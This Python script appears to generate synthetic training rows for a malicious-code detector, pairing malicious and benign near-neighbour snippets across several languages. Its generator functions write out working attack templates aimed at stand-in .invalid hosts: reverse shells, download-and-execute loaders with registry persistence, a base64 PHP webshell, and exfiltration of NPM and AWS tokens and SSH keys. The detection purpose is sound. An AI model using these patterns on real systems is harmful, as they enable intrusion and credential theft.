"""Add train-only behavior-chain examples without changing frozen evaluation.

The snippets are compact static source examples representing multiple lexical
variants of common malicious chains and benign near-neighbours. They are never
executed and are assigned train-only families that do not occur in validation
or test.
"""

from __future__ import annotations

import argparse
import hashlib
import json
from collections import Counter, defaultdict
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
LANGUAGES = (
    "bash", "c", "config", "cpp", "go", "html", "java", "javascript",
    "php", "powershell", "python", "ruby", "rust",
)


def _row(
    language: str,
    label: str,
    family: str,
    index: int,
    code: str,
) -> dict[str, Any]:
    digest = hashlib.sha256(code.encode("utf-8")).hexdigest()
    return {
        "code": code,
        "normalized_code": code,
        "label": label,
        "category": (
            "curated_behavior_chain"
            if label == "malicious"
            else "curated_benign_near_neighbour"
        ),
        "language": language,
        "cwe": "",
        "source": "curated_behavior_augmentation",
        "package_name": family,
        "version": "v62",
        "license": "project-curated synthetic static snippet",
        "sample_hash": digest,
        "family": f"curated:v62:{language}:{family}",
        "published_at": "",
        "split": "train",
        "artifact_sha256": digest,
        "source_url": "",
        "file_path": f"{family}_{index:03d}.{_extension(language)}",
        "paired_version": "",
        "label_basis": "explicit_file_local_behavior_chain",
        "behavior_labels": [family] if label == "malicious" else [],
        "cwe_labels": [],
        "label_confidence": 0.98 if label == "malicious" else 0.95,
        "review_status": (
            "behavior_verified" if label == "malicious" else "generated_variant"
        ),
        "parent_sample_hash": "",
        "pair_id": "",
        "pair_slot": "train_augmentation",
        "review_notes": (
            "Train-only lexical variant; excluded from validation, frozen test, "
            "and behavior canaries."
        ),
        "line_labels": [],
        "label_scopes": ["malicious_intent"],
    }


def _extension(language: str) -> str:
    return {
        "bash": "sh",
        "go": "go",
        "java": "java",
        "javascript": "js",
        "php": "php",
        "powershell": "ps1",
    }[language]


def _bash_rows() -> list[dict[str, Any]]:
    rows = []
    sources = ("configs", "settings", "reports", "manifests", "assets", "logs")
    roots = ("/var/backups", "/tmp/archive", "${WORKDIR}/backups", "./dist")
    for index in range(48):
        source = sources[index % len(sources)]
        root = roots[index % len(roots)]
        if index < 24:
            code = (
                "#!/usr/bin/env bash\n"
                "set -euo pipefail\n"
                f"archive_root=\"{root}\"\n"
                "mkdir -p \"${archive_root}\"\n"
                f"tar -czf \"${{archive_root}}/{source}-${{BUILD_ID:-local}}-{index}.tgz\" "
                f"\"./{source}\"\n"
                "printf 'local archive complete\\n'\n"
            )
        else:
            code = (
                f"mkdir -p \"{root}/{index}\"\n"
                f"tar -czf \"{root}/{index}/{source}.tgz\" \"./{source}\"\n"
            )
        rows.append(_row("bash", "benign", "local_archive", index, code))
    return rows


def _go_rows() -> list[dict[str, Any]]:
    rows = []
    shells = ("/bin/sh", "/bin/bash", "cmd.exe", "powershell.exe")
    variables = ("conn", "channel", "socket", "link")
    for index in range(48):
        shell = shells[index % len(shells)]
        variable = variables[index % len(variables)]
        code = (
            'package main\nimport ("net"; "os/exec")\n'
            f'func main(){{ {variable},_:=net.Dial("tcp","node{index}.invalid:'
            f'{4100 + index}"); p:=exec.Command("{shell}"); '
            f"p.Stdin={variable}; p.Stdout={variable}; p.Stderr={variable}; "
            "_=p.Run() }\n"
        )
        rows.append(_row("go", "malicious", "reverse_shell", index, code))
    for index in range(48):
        destination = ("dest", "target", "outfile", "tmp")[index % 4]
        code = (
            'package main\nimport ("net/http"; "os"; "io"; "os/exec")\n'
            f'func main(){{ r,_:=http.Get("https://cdn{index}.invalid/blob"); '
            f'{destination},_:=os.Create("/tmp/update-{index}"); '
            f"io.Copy({destination},r.Body); {destination}.Close(); "
            f'_ = exec.Command("/tmp/update-{index}").Run() }}\n'
        )
        rows.append(_row("go", "malicious", "download_execute", index, code))
    for index in range(24):
        code = (
            'package main\nimport ("net/http"; "encoding/json")\n'
            f'func main(){{ r,_:=http.Get("https://service{index}.example/'
            'health"); defer r.Body.Close(); var v map[string]any; '
            "json.NewDecoder(r.Body).Decode(&v) }\n"
        )
        rows.append(_row("go", "benign", "http_health_client", index, code))
    for index in range(24):
        code = (
            'package main\nimport ("os"; "os/exec")\n'
            f'func main(){{ p:=exec.Command("git","-C","./workspace-{index}",'
            f'"status","--porcelain=v{index % 2 + 1}"); '
            "p.Stdout=os.Stdout; _=p.Run() }\n"
        )
        rows.append(_row("go", "benign", "local_tool_runner", index, code))
    return rows


def _powershell_rows() -> list[dict[str, Any]]:
    rows = []
    fetchers = (
        "Invoke-WebRequest '{url}' -OutFile $payload",
        "(New-Object Net.WebClient).DownloadFile('{url}', $payload)",
    )
    for index in range(48):
        fetch = fetchers[index % len(fetchers)].format(
            url=f"https://stage{index}.invalid/agent.ps1"
        )
        code = (
            f"$payload = Join-Path $env:APPDATA '.worker{index}.ps1'\n"
            f"{fetch}\n"
            "Start-Process powershell -WindowStyle Hidden "
            "-ArgumentList '-File', $payload\n"
            "$run = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n"
            f"New-ItemProperty -Path $run -Name Worker{index} "
            "-Value \"powershell -w hidden -f $payload\" -Force\n"
        )
        rows.append(_row(
            "powershell", "malicious", "download_execute_persist", index, code
        ))
    for index in range(48):
        code = (
            "$client = New-Object Net.WebClient\n"
            f"$encoded = $client.DownloadString('https://stage{index}.invalid/data')\n"
            "$bytes = [Convert]::FromBase64String($encoded)\n"
            "$script = [Text.Encoding]::UTF8.GetString($bytes)\n"
            "Invoke-Expression $script\n"
        )
        rows.append(_row(
            "powershell", "malicious", "encoded_remote_loader", index, code
        ))
    for index in range(24):
        code = (
            f"$target = Join-Path $env:TEMP 'tool-{index}.msi'\n"
            f"Invoke-WebRequest 'https://downloads.example/tool-{index}.msi' "
            "-OutFile $target\n"
            "Write-Output \"Downloaded installer to $target\"\n"
        )
        rows.append(_row(
            "powershell", "benign", "download_only_installer", index, code
        ))
    for index in range(24):
        code = (
            f"$source = Join-Path $PSScriptRoot 'config-{index}'\n"
            f"$target = Join-Path $env:TEMP 'config-{index}.zip'\n"
            "Compress-Archive -Path $source -DestinationPath $target -Force\n"
        )
        rows.append(_row(
            "powershell", "benign", "local_archive", index, code
        ))
    return rows


def _java_rows() -> list[dict[str, Any]]:
    rows = []
    shells = ("/bin/sh", "/bin/bash", "cmd.exe", "powershell.exe")
    for index in range(48):
        shell = shells[index % len(shells)]
        code = (
            "import java.net.*; import java.io.*; "
            f"class Channel{index} {{ public static void main(String[] a) throws Exception {{ "
            f'Socket link=new Socket("node{index}.invalid",{4300 + index}); '
            f'Process proc=new ProcessBuilder("{shell}").redirectErrorStream(true).start(); '
            "link.getInputStream().transferTo(proc.getOutputStream()); "
            "proc.getInputStream().transferTo(link.getOutputStream()); }} }"
        )
        rows.append(_row("java", "malicious", "socket_command_shell", index, code))
    for index in range(48):
        code = (
            "import java.net.*; import java.nio.file.*; "
            f"class Loader{index} {{ public static void main(String[] a) throws Exception {{ "
            f'Path target=Files.createTempFile("update{index}",".bin"); '
            f'Files.copy(new URL("https://cdn{index}.invalid/data").openStream(),target,'
            "StandardCopyOption.REPLACE_EXISTING); target.toFile().setExecutable(true); "
            "Runtime.getRuntime().exec(target.toString()); }} }"
        )
        rows.append(_row("java", "malicious", "download_execute", index, code))
    for index in range(24):
        code = (
            "import java.net.http.*; import java.net.URI; "
            f"class Health{index} {{ void check() throws Exception {{ "
            f'var request=HttpRequest.newBuilder(URI.create("https://service{index}.example/health")).build(); '
            "HttpClient.newHttpClient().send(request,HttpResponse.BodyHandlers.ofString()); }} }"
        )
        rows.append(_row("java", "benign", "http_health_client", index, code))
    for index in range(24):
        code = (
            f"class Build{index} {{ void status() throws Exception {{ "
            f'new ProcessBuilder("git","-C","workspace-{index}","status","--porcelain")'
            ".inheritIO().start().waitFor(); }} }"
        )
        rows.append(_row("java", "benign", "local_tool_runner", index, code))
    return rows


def _javascript_rows() -> list[dict[str, Any]]:
    rows = []
    for index in range(48):
        code = (
            f"fetch('https://stage{index}.invalid/code').then(r=>r.text())"
            ".then(source=>eval(source));"
        )
        rows.append(_row(
            "javascript", "malicious", "remote_eval_loader", index, code
        ))
    for index in range(48):
        code = (
            f"const secrets{index}={{token:process.env.NPM_TOKEN,"
            "key:process.env.AWS_SECRET_ACCESS_KEY}};"
            f"fetch('https://collector{index}.invalid/api',{{method:'POST',"
            f"body:JSON.stringify(secrets{index})}});"
        )
        rows.append(_row(
            "javascript", "malicious", "credential_exfiltration", index, code
        ))
    for index in range(24):
        code = (
            f"fetch('/api/status?node={index}').then(r=>r.json())"
            f".then(v=>document.querySelector('#state-{index}').textContent=v.state);"
        )
        rows.append(_row(
            "javascript", "benign", "api_status_view", index, code
        ))
    for index in range(24):
        code = (
            "const {spawn}=require('child_process');"
            f"spawn('git',['-C','workspace-{index}','status','--porcelain'],"
            "{stdio:'inherit'});"
        )
        rows.append(_row(
            "javascript", "benign", "local_tool_runner", index, code
        ))
    return rows


def _php_rows() -> list[dict[str, Any]]:
    rows = []
    inputs = ("_POST", "_GET", "_REQUEST", "_COOKIE")
    for index in range(48):
        source = inputs[index % len(inputs)]
        code = (
            f"<?php $encoded=${source}['payload{index}']; "
            "$decoded=base64_decode($encoded); eval($decoded); ?>"
        )
        rows.append(_row("php", "malicious", "encoded_webshell", index, code))
    for index in range(48):
        code = (
            f"<?php $secret=file_get_contents('/home/user{index}/.ssh/id_rsa'); "
            f"$c=curl_init('https://collector{index}.invalid/upload'); "
            "curl_setopt($c,CURLOPT_POST,true); "
            "curl_setopt($c,CURLOPT_POSTFIELDS,['credentials'=>$secret]); "
            "curl_exec($c); ?>"
        )
        rows.append(_row(
            "php", "malicious", "credential_exfiltration", index, code
        ))
    for index in range(24):
        code = (
            f"<?php $stmt=$pdo->prepare('SELECT name FROM users WHERE id = ?'); "
            f"$stmt->execute([(int)$_GET['id{index}']]); "
            "echo htmlspecialchars($stmt->fetchColumn()); ?>"
        )
        rows.append(_row("php", "benign", "prepared_query", index, code))
    for index in range(24):
        code = (
            f"<?php $zip=new ZipArchive(); $zip->open('/tmp/config-{index}.zip',"
            "ZipArchive::CREATE); "
            f"$zip->addFile('./config/app-{index}.php','app.php'); $zip->close(); ?>"
        )
        rows.append(_row("php", "benign", "local_archive", index, code))
    return rows


def _verify_isolation(rows: list[dict[str, Any]]) -> tuple[bool, list[str]]:
    family_splits: dict[str, set[str]] = defaultdict(set)
    hash_splits: dict[str, set[str]] = defaultdict(set)
    for row in rows:
        family_splits[str(row["family"])].add(str(row["split"]))
        hash_splits[str(row["sample_hash"])].add(str(row["split"]))
    violations = [
        f"family:{family}" for family, splits in family_splits.items()
        if len(splits) > 1
    ]
    violations.extend(
        f"hash:{digest}" for digest, splits in hash_splits.items()
        if len(splits) > 1
    )
    return not violations, violations[:50]


def _malicious_task_training_eligible(row: dict[str, Any]) -> bool:
    review_status = str(row.get("review_status") or "")
    confidence = float(row.get("label_confidence") or 0.0)
    if review_status not in {
        "source_verified",
        "approved",
        "generated_variant",
        "differentially_verified",
        "behavior_verified",
    } or confidence < 0.8:
        return False
    label = str(row.get("label") or "")
    scopes = {str(value) for value in (row.get("label_scopes") or [])}
    return label == "benign" or (
        label == "malicious"
        and (not scopes or "malicious_intent" in scopes)
    )


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--input-routes", required=True)
    parser.add_argument("--output-routes", required=True)
    parser.add_argument("--output-dataset", required=True)
    parser.add_argument("--report", required=True)
    args = parser.parse_args()

    input_routes = Path(args.input_routes)
    output_routes = Path(args.output_routes)
    output_dataset = Path(args.output_dataset)
    report_path = Path(args.report)
    output_routes.mkdir(parents=True, exist_ok=True)
    output_dataset.parent.mkdir(parents=True, exist_ok=True)
    report_path.parent.mkdir(parents=True, exist_ok=True)

    additions = {
        "bash": _bash_rows(),
        "go": _go_rows(),
        "java": _java_rows(),
        "javascript": _javascript_rows(),
        "php": _php_rows(),
        "powershell": _powershell_rows(),
    }
    all_rows: list[dict[str, Any]] = []
    added_counts = Counter()
    for language in LANGUAGES:
        source = input_routes / f"{language}.jsonl"
        with source.open("r", encoding="utf-8", newline="\n") as stream:
            rows = [
                json.loads(line)
                for line in stream
                if line.strip()
            ]
        language_additions = additions.get(language, [])
        existing_hashes = {str(row["sample_hash"]) for row in rows}
        for row in language_additions:
            if row["sample_hash"] not in existing_hashes:
                rows.append(row)
                existing_hashes.add(row["sample_hash"])
                added_counts[(language, row["label"], row["family"])] += 1
        destination = output_routes / f"{language}.jsonl"
        destination.write_text(
            "".join(json.dumps(row, ensure_ascii=False) + "\n" for row in rows),
            encoding="utf-8",
        )
        all_rows.extend(rows)

    isolation_verified, violations = _verify_isolation(all_rows)
    output_dataset.write_text(
        "".join(json.dumps(row, ensure_ascii=False) + "\n" for row in all_rows),
        encoding="utf-8",
    )
    report = {
        "input_routes": str(input_routes.resolve()),
        "output_routes": str(output_routes.resolve()),
        "output_dataset": str(output_dataset.resolve()),
        "output_rows": len(all_rows),
        "training_eligible_rows": sum(
            _malicious_task_training_eligible(row) for row in all_rows
        ),
        "added_rows": sum(added_counts.values()),
        "added_counts": [
            {
                "language": language,
                "label": label,
                "family": family,
                "count": count,
            }
            for (language, label, family), count in sorted(added_counts.items())
        ],
        "validation_and_test_rows_added": 0,
        "family_split_isolation_verified": isolation_verified,
        "isolation_violations": violations,
        "static_only": True,
        "canaries_used_as_training_rows": False,
    }
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    print(json.dumps(report, ensure_ascii=False, indent=2))
    if not isolation_verified:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
